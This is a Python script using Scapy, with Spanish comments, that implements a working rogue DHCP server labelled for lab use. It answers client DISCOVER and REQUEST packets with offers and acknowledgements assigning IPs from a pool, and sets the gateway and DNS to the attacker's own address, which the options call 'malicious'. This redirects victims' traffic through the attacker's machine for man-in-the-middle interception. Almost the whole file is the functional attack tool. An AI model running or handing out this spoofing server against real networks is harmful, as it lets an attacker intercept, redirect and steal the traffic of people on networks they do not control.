#!/usr/bin/env python3
"""
DHCP Spoofing - Servidor Rogue Funcional Corregido
"""

import argparse
import ipaddress
import os
import random
import signal
import subprocess
import sys
import time
from scapy.all import BOOTP, DHCP, Ether, IP, UDP, conf, get_if_hwaddr, sendp, sniff

running = True


def signal_handler(sig, frame):
    global running
    running = False
    print("\n[!] Deteniendo servidor...")


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def require_root():
    if os.geteuid() != 0:
        print("[!] Ejecutar con sudo")
        sys.exit(1)


def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""


def list_interfaces():
    return [i for i in sorted(os.listdir("/sys/class/net")) if i != "lo"]


def get_ip_line(iface):
    return run_cmd(["ip", "-br", "addr", "show", iface]) or iface


def choose_interface(default="eth0"):
    interfaces = list_interfaces()
    if not interfaces:
        print("[!] No se encontraron interfaces")
        sys.exit(1)
    
    print("\n[+] Interfaces disponibles:\n")
    for idx, iface in enumerate(interfaces, 1):
        print(f"  {idx}. {get_ip_line(iface)}")
    print("")
    
    if default not in interfaces:
        default = interfaces[0]
    
    value = input(f"[?] Selecciona interfaz [Enter={default}]: ").strip()
    
    if value == "":
        return default
    if value.isdigit() and 1 <= int(value) <= len(interfaces):
        return interfaces[int(value) - 1]
    if value in interfaces:
        return value
    
    print(f"[!] Interfaz inválida: {value}")
    sys.exit(1)


def valid_ip(value):
    try:
        ipaddress.ip_address(value)
        return True
    except:
        return False


def ip_to_int(ip):
    return int(ipaddress.IPv4Address(ip))


def int_to_ip(value):
    return str(ipaddress.IPv4Address(value))


def parse_pool(pool):
    if "-" not in pool:
        print("[!] Pool debe ser inicio-fin (ej: 192.168.1.100-192.168.1.200)")
        sys.exit(1)
    
    start, end = pool.split("-", 1)
    start, end = start.strip(), end.strip()
    
    if not valid_ip(start) or not valid_ip(end):
        print("[!] IPs de pool inválidas")
        sys.exit(1)
    
    start_int, end_int = ip_to_int(start), ip_to_int(end)
    if start_int > end_int:
        print("[!] IP inicio no puede ser mayor que IP fin")
        sys.exit(1)
    
    return start_int, end_int


def get_dhcp_option(pkt, name):
    if DHCP not in pkt:
        return None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == name:
            return opt[1]
    return None


def mac_to_clean(mac):
    return mac.lower().replace(":", "").replace("-", "")


def ensure_bytes_chaddr(chaddr):
    """Asegura que chaddr sea bytes de 16 bytes exactos"""
    if isinstance(chaddr, str):
        chaddr = bytes.fromhex(chaddr.replace(":", "").replace("-", ""))
    if len(chaddr) < 16:
        chaddr = chaddr + b'\x00' * (16 - len(chaddr))
    return chaddr[:16]


def next_pool_ip(state):
    start, end = state["pool_start"], state["pool_end"]
    
    for _ in range(end - start + 1):
        current = state["next_ip"]
        if current > end:
            current = start
            state["next_ip"] = start
        state["next_ip"] = current + 1
        
        ip = int_to_ip(current)
        if ip not in state["excluded"] and ip not in state["used_ips"]:
            state["used_ips"].add(ip)
            return ip
    
    return None


def get_lease(mac, state):
    if mac in state["leases"]:
        return state["leases"][mac]
    
    ip = next_pool_ip(state)
    if ip:
        state["leases"][mac] = ip
    return ip


def make_dhcp_packet(args, state, request_pkt, msg_type, yiaddr):
    """Construye respuesta DHCP con formato correcto"""
    client_mac = request_pkt[Ether].src
    server_mac = state["server_mac"]
    xid = request_pkt[BOOTP].xid
    flags = request_pkt[BOOTP].flags
    
    # CORRECCIÓN: Asegurar chaddr de 16 bytes
    chaddr = ensure_bytes_chaddr(request_pkt[BOOTP].chaddr)
    
    # Opciones DHCP
    options = [
        ("message-type", msg_type),
        ("server_id", args.server_ip),
        ("lease_time", args.lease_time),
        ("renewal_time", int(args.lease_time * 0.5)),
        ("rebinding_time", int(args.lease_time * 0.875)),
        ("subnet_mask", args.subnet_mask),
        ("router", args.gateway),
        ("name_server", args.dns),
        ("domain", args.domain),
        "end"
    ]
    
    pkt = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=args.server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,           # BOOTREPLY
            htype=1,        # Ethernet
            hlen=6,         # MAC length
            xid=xid,
            flags=flags,
            yiaddr=yiaddr,  # Your IP
            siaddr=args.server_ip,
            chaddr=chaddr   # CORRECCIÓN: 16 bytes exactos
        ) /
        DHCP(options=options)
    )
    
    return pkt


def send_offer(args, state, pkt, offered_ip):
    response = make_dhcp_packet(args, state, pkt, "offer", offered_ip)
    sendp(response, iface=args.iface, verbose=False)
    state["offers"] += 1
    
    print(f"📤 OFFER → {pkt[Ether].src} | IP: {offered_ip} | GW: {args.gateway}")


def send_ack(args, state, pkt, assigned_ip):
    response = make_dhcp_packet(args, state, pkt, "ack", assigned_ip)
    sendp(response, iface=args.iface, verbose=False)
    state["acks"] += 1
    
    print(f"📤 ACK   → {pkt[Ether].src} | IP: {assigned_ip} | GW: {args.gateway}")


def handle_packet(args, state, pkt):
    """Procesa paquetes DHCP entrantes"""
    try:
        if DHCP not in pkt or BOOTP not in pkt or Ether not in pkt:
            return
        
        msg_type = get_dhcp_option(pkt, "message-type")
        if msg_type is None:
            return
        
        client_mac = pkt[Ether].src
        clean_mac = mac_to_clean(client_mac)
        
        # DISCOVER
        if msg_type == 1 or msg_type == "discover":
            offered_ip = get_lease(clean_mac, state)
            if offered_ip:
                send_offer(args, state, pkt, offered_ip)
        
        # REQUEST
        elif msg_type == 3 or msg_type == "request":
            requested_ip = get_dhcp_option(pkt, "requested_addr")
            assigned_ip = state["leases"].get(clean_mac)
            
            # Si solicita IP específica y está en nuestro pool, respetarla
            if requested_ip:
                if isinstance(requested_ip, bytes):
                    requested_ip = requested_ip.decode()
                
                req_int = ip_to_int(requested_ip)
                if state["pool_start"] <= req_int <= state["pool_end"]:
                    assigned_ip = requested_ip
                    state["leases"][clean_mac] = assigned_ip
                    state["used_ips"].add(assigned_ip)
            
            # Si no tiene lease, asignar nueva
            if assigned_ip is None:
                assigned_ip = get_lease(clean_mac, state)
            
            if assigned_ip:
                send_ack(args, state, pkt, assigned_ip)
                
    except Exception as e:
        print(f"[!] Error procesando paquete: {e}")


def validate_args(args):
    for field, name in [(args.server_ip, "server-ip"), (args.gateway, "gateway"), 
                        (args.dns, "dns"), (args.subnet_mask, "subnet-mask")]:
        if not valid_ip(field):
            print(f"[!] {name} inválida: {field}")
            sys.exit(1)
    
    args.pool_start, args.pool_end = parse_pool(args.pool)
    
    # Parsear IPs excluidas
    excluded = set()
    for ip in args.exclude.split(","):
        ip = ip.strip()
        if ip and valid_ip(ip):
            excluded.add(ip)
    args.excluded_set = excluded


def main():
    parser = argparse.ArgumentParser(description="DHCP Rogue Server - Lab")
    parser.add_argument("-i", "--iface", default=None, help="Interfaz de red")
    parser.add_argument("--server-ip", default="192.168.1.50", help="IP del servidor rogue")
    parser.add_argument("--gateway", default="192.168.1.50", help="Gateway malicioso")
    parser.add_argument("--dns", default="192.168.1.50", help="DNS malicioso")
    parser.add_argument("--subnet-mask", default="255.255.255.0")
    parser.add_argument("--pool", default="192.168.1.100-192.168.1.200", help="Rango de IPs")
    parser.add_argument("--exclude", default="", help="IPs excluidas (separadas por coma)")
    parser.add_argument("--lease-time", type=int, default=3600)
    parser.add_argument("--domain", default="lab.local")
    parser.add_argument("--yes", action="store_true", help="No pedir confirmación")
    
    args = parser.parse_args()
    require_root()
    
    if args.iface is None:
        args.iface = choose_interface("eth0")
    
    validate_args(args)
    
    try:
        server_mac = get_if_hwaddr(args.iface)
    except:
        print(f"[!] No pude obtener MAC de {args.iface}")
        sys.exit(1)
    
    conf.iface = args.iface
    conf.verb = 0
    
    state = {
        "server_mac": server_mac,
        "pool_start": args.pool_start,
        "pool_end": args.pool_end,
        "next_ip": args.pool_start,
        "excluded": args.excluded_set,
        "leases": {},
        "used_ips": set(),
        "offers": 0,
        "acks": 0
    }
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                 DHCP ROGUE SERVER - LAB                       ║
╠══════════════════════════════════════════════════════════════╣
  Interfaz:      {args.iface}
  MAC Server:   {server_mac}
  Server IP:    {args.server_ip}
  Pool:         {args.pool}
  Excluidas:    {len(args.excluded_set)} IPs
  Gateway:      {args.gateway}
  DNS:          {args.dns}
  Lease Time:   {args.lease_time}s
╚══════════════════════════════════════════════════════════════╝
""")
    
    if not args.yes:
        confirm = input("[?] Presiona Enter para iniciar o 'n' para cancelar: ").strip().lower()
        if confirm in ['n', 'no']:
            print("[*] Cancelado")
            sys.exit(0)
    
    print("[*] Servidor iniciado. Esperando solicitudes DHCP...\n")
    
    try:
        sniff(
            iface=args.iface,
            filter="udp and (port 67 or port 68)",
            store=False,
            prn=lambda pkt: handle_packet(args, state, pkt),
            stop_filter=lambda x: not running
        )
    except KeyboardInterrupt:
        pass
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
                         RESUMEN
╠══════════════════════════════════════════════════════════════╣
  OFFER enviados:  {state['offers']}
  ACK enviados:    {state['acks']}
  Leases activos:  {len(state['leases'])}
╚══════════════════════════════════════════════════════════════╝
""")


if __name__ == "__main__":
    main()